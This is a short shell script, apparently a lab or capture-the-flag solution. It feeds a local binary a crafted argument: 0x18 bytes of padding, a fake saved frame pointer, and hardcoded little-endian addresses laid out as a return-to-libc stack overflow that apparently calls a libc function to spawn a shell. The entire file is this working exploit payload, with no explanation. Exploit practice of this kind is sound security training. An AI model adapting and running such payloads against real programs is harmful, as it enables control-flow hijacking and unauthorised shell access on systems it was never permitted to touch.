#!/bin/sh
./a.out "$(python -c 'print "A"*0x18 + "BBBB" + "\x40\x69\xe5\xf7" + "CCCC" + "\x8b\x4e\xf7\xf7"')"
